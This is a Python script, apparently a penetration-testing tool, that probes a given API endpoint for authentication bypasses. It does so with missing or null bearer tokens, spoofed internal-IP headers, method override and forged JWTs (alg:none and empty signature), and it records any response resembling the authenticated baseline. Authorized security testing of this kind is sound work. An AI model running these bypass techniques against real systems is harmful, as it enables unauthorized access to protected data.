#!/usr/bin/env python3
"""
Authentication Bypass Detection Script
Tests common auth bypass techniques on an endpoint.

Usage:
  python3 authbypass.py --url "https://target.com/api/admin/users" \
    --valid-token "Bearer eyJ..." \
    --output results.json

Output: Structured JSON with findings.
"""
import argparse
import base64
import json
import os
import sys

sys.path.insert(0, os.path.dirname(__file__))
from client import make_request


def req(url, method="GET", headers=None, data=None, timeout=10):
    return make_request(url, method=method, extra_headers=headers, data=data,
                        truncate=1000, timeout=timeout)

def main():
    parser = argparse.ArgumentParser(description="Auth Bypass Detection")
    parser.add_argument("--url", required=True)
    parser.add_argument("--valid-token", required=True, help="Known valid auth token")
    parser.add_argument("--output", default=None)
    args = parser.parse_args()

    results = {"target": args.url, "findings": [], "summary": {"bypasses": 0, "blocked": 0}}

    # Baseline: valid auth
    baseline = req(args.url, headers={"Authorization": args.valid_token})
    results["baseline"] = {"status": baseline["status"], "length": baseline.get("length", 0)}

    tests = [
        # No auth
        {"name": "No auth header", "headers": {}},
        # Empty bearer
        {"name": "Empty Bearer", "headers": {"Authorization": "Bearer "}},
        # Null token
        {"name": "Null token", "headers": {"Authorization": "Bearer null"}},
        # Internal headers
        {"name": "X-Forwarded-For: 127.0.0.1", "headers": {"Authorization": "", "X-Forwarded-For": "127.0.0.1"}},
        {"name": "X-Real-IP: 127.0.0.1", "headers": {"Authorization": "", "X-Real-IP": "127.0.0.1"}},
        {"name": "X-Internal-Request: true", "headers": {"X-Internal-Request": "true"}},
        {"name": "X-Custom-IP-Authorization: 127.0.0.1", "headers": {"X-Custom-IP-Authorization": "127.0.0.1"}},
        # Method override
        {"name": "Method override GET→POST", "headers": {"Authorization": "", "X-HTTP-Method-Override": "GET"}, "method": "POST"},
        # Content-type tricks
        {"name": "Content-Type: application/xml", "headers": {"Authorization": args.valid_token, "Content-Type": "application/xml"}},
    ]

    # JWT-specific tests if token looks like JWT
    token_value = args.valid_token.replace("Bearer ", "")
    parts = token_value.split(".")
    if len(parts) == 3:
        try:
            # alg:none attack
            header = json.loads(base64.b64decode(parts[0] + "==").decode())
            header["alg"] = "none"
            fake_header = base64.b64encode(json.dumps(header).encode()).decode().rstrip("=")
            none_token = f"{fake_header}.{parts[1]}."
            tests.append({"name": "JWT alg:none", "headers": {"Authorization": f"Bearer {none_token}"}})

            # Empty signature
            tests.append({"name": "JWT empty signature", "headers": {"Authorization": f"Bearer {parts[0]}.{parts[1]}."}})
        except (ValueError, json.JSONDecodeError, base64.binascii.Error) as e:
            print(f"[auth-test] warning: JWT decode failed, skipping JWT-specific tests: {e}", file=sys.stderr)

    for test in tests:
        method = test.get("method", "GET")
        resp = req(args.url, method=method, headers=test["headers"])

        finding = {"test": test["name"], "status": resp["status"], "length": resp.get("length", 0)}

        # Check if bypass succeeded: got same/similar response as baseline
        if resp["status"] and resp["status"] == baseline["status"] and resp.get("length", 0) > 0:
            if abs(resp.get("length", 0) - baseline.get("length", 0)) < 100:
                finding["result"] = "BYPASS"
                finding["detail"] = f"Got {resp['status']} with similar response length — auth bypass likely"
                finding["evidence"] = resp["body"][:300]
                results["summary"]["bypasses"] += 1
            else:
                finding["result"] = "DIFFERENT_RESPONSE"
                finding["detail"] = f"Got {resp['status']} but different length ({resp.get('length',0)} vs {baseline.get('length',0)})"
                results["summary"]["blocked"] += 1
        elif resp["status"] and 200 <= resp["status"] < 400 and baseline["status"] and baseline["status"] >= 400:
            finding["result"] = "BYPASS"
            finding["detail"] = f"Bypassed! Baseline was {baseline['status']}, bypass got {resp['status']}"
            finding["evidence"] = resp["body"][:300]
            results["summary"]["bypasses"] += 1
        else:
            finding["result"] = "BLOCKED"
            finding["detail"] = f"Got {resp['status']}"
            results["summary"]["blocked"] += 1

        results["findings"].append(finding)

    output = json.dumps(results, indent=2)
    print(output)
    if args.output:
        with open(args.output, "w") as f:
            f.write(output)

if __name__ == "__main__":
    main()
